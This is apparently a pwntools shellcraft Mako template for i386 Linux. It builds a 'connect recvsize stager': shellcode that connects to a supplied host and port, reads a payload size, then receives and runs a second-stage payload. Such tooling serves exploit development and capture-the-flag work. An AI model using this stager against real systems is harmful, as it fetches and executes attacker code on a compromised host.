<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.i386 import linux %>
<%docstring>
connect recvsize stager
Args:
    host, where to connect to
    port, which port to connect to
    network, ipv4 or ipv6? (default: ipv4)
</%docstring>
<%page args="host, port, network = 'ipv4'"/>

${linux.connect(host, port, network)}
${linux.recvsize('ebp', 'ecx')}
${linux.stager('ebx', 'ecx')}
